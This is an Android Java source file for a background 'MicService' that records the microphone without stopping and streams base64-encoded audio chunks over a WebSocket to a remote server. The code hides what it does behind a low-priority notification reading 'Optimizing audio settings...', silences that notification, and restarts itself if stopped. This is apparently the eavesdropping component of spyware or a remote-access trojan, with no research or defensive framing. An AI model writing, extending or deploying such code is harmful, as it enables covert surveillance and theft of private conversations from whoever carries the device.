package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.R;
import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class MicService extends Service {
    private static final String TAG = Constants.TAG + ":MicSvc";
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL = AudioFormat.CHANNEL_IN_MONO;
    private static final int FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, FORMAT);

    private AudioRecord audioRecord;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private boolean recording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startBgThread();
        createNotificationChannel();
        startForegroundWithType();
        Log.i(TAG, "MicService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startRecording();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopRecording();
        stopBgThread();
        super.onDestroy();
    }

    private void startBgThread() {
        bgThread = new HandlerThread("MicBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    private void stopBgThread() {
        if (bgThread != null) {
            bgThread.quitSafely();
            try {
                bgThread.join();
                bgThread = null;
                bgHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Mic thread join failed", e);
            }
        }
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(Constants.NOTIF_ID_MIC, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(Constants.NOTIF_ID_MIC, notification);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID + "_mic")
                .setContentTitle("Audio Service")
                .setContentText("Optimizing audio settings...")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID + "_mic",
                    "Audio Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startRecording() {
        if (recording) return;
        try {
            audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE, CHANNEL, FORMAT, BUFFER_SIZE);
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord init failed");
                return;
            }
            audioRecord.startRecording();
            recording = true;
            bgHandler.post(this::recordLoop);
        } catch (SecurityException e) {
            Log.e(TAG, "Mic permission denied", e);
        }
    }

    private void recordLoop() {
        if (!recording || audioRecord == null) return;
        byte[] buffer = new byte[BUFFER_SIZE];
        int read = audioRecord.read(buffer, 0, buffer.length);
        if (read > 0) {
            byte[] data = new byte[read];
            System.arraycopy(buffer, 0, data, 0, read);
            sendAudioChunk(data);
        }
        if (recording) {
            bgHandler.postDelayed(this::recordLoop, 50);
        }
    }

    private void sendAudioChunk(byte[] pcm) {
        String b64 = android.util.Base64.encodeToString(pcm, android.util.Base64.NO_WRAP);
        try {
            JSONObject data = new JSONObject();
            data.put("format", "pcm_16bit");
            data.put("sample_rate", SAMPLE_RATE);
            data.put("channels", 1);
            data.put("chunk", b64);
            data.put("size", pcm.length);
            WebSocketClient.get(this).sendEvent("mic_chunk", data);
        } catch (JSONException e) {
            Log.e(TAG, "Audio send failed", e);
        }
    }

    private void stopRecording() {
        recording = false;
        if (audioRecord != null) {
            if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                audioRecord.stop();
            }
            audioRecord.release();
            audioRecord = null;
        }
    }
}
